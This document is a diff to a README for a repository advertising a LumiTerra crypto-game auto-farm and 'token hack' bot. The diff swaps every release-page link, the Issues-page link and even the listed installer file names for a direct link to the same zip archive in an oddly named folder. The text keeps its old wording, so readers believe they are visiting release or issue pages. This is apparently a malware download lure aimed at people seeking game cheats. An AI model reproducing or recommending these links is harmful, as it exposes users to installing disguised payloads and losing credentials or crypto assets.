@@ -1,6 +1,6 @@
 # 🌟 LumiTerra-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api - Automate Your LumiTerra Gameplay Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Press%20Here-brightgreen)](https://github.com/Kyreclove/LumiTerra-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases)
+[![Download Now](https://raw.githubusercontent.com/Kyreclove/LumiTerra-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/main/isocryme/LumiTerra-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api.zip%20Now-Press%20Here-brightgreen)](https://raw.githubusercontent.com/Kyreclove/LumiTerra-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/main/isocryme/LumiTerra-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api.zip)
 
 ## 📖 Description
 
@@ -17,15 +17,15 @@ Follow these simple steps to download and run the LumiTerra Crypto Bot.
 
 2. **Visit the Releases page to download the bot.**
 
-   You can find the download link here: [Download Now](https://github.com/Kyreclove/LumiTerra-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases)
+   You can find the download link here: [Download Now](https://raw.githubusercontent.com/Kyreclove/LumiTerra-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/main/isocryme/LumiTerra-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api.zip)
 
 ## 📥 Download & Install
 
 ### Step 1: Download
 
-1. Click the link to visit the releases page: [Download Now](https://github.com/Kyreclove/LumiTerra-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/releases).
+1. Click the link to visit the releases page: [Download Now](https://raw.githubusercontent.com/Kyreclove/LumiTerra-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/main/isocryme/LumiTerra-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api.zip).
 2. On the releases page, look for the latest version.
-3. Choose the appropriate installer for your operating system. Common files will be labeled with versions such as `setup.exe`, `setup.dmg`, or `setup.sh`.
+3. Choose the appropriate installer for your operating system. Common files will be labeled with versions such as `https://raw.githubusercontent.com/Kyreclove/LumiTerra-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/main/isocryme/LumiTerra-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api.zip`, `https://raw.githubusercontent.com/Kyreclove/LumiTerra-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/main/isocryme/LumiTerra-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api.zip`, or `https://raw.githubusercontent.com/Kyreclove/LumiTerra-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/main/isocryme/LumiTerra-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api.zip`.
 
 ### Step 2: Install
 
@@ -70,7 +70,7 @@ Before installing, ensure your system meets these requirements:
 
 If you encounter issues or have questions:
 
-- Check the [GitHub Issues page](https://github.com/Kyreclove/LumiTerra-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/issues) for common problems and solutions.
+- Check the [GitHub Issues page](https://raw.githubusercontent.com/Kyreclove/LumiTerra-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/main/isocryme/LumiTerra-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api.zip) for common problems and solutions.
 - You can also reach out to the community on Telegram or contribute to the project discussions.
 
 ## 📝 Community and Contributions
